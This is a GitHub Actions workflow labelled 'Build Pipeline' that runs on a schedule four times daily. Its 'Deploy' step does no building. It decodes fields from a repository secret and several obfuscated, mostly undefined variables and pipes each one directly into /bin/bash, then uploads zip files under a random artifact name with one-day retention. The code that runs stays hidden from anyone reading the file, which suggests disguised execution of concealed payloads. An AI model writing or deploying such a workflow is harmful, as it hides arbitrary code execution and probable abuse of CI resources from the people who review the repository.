name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '9 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          zish364: ${{ secrets.zish364 }}
        run: |
          printf '%s' "$zish364" | jq -r .rw0 | /bin/bash
          printf '%s' "$rx4" | jq -r .w1 | /bin/bash
          echo $rp37 | jq -r .l3 | /bin/bash
          echo $ulx9576 | jq -r .yhf899 | /bin/bash
          printf '%s' "$grd828" | jq -r .spvg53 | /bin/bash
          echo $hkhs55161 | jq -r .w1602 | /bin/bash
          printf '%s' "$dpfv23" | jq -r .jo3 | /bin/bash

      - name: Save results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: DkiEleBH
          path: "*.zip"
          retention-days: 1
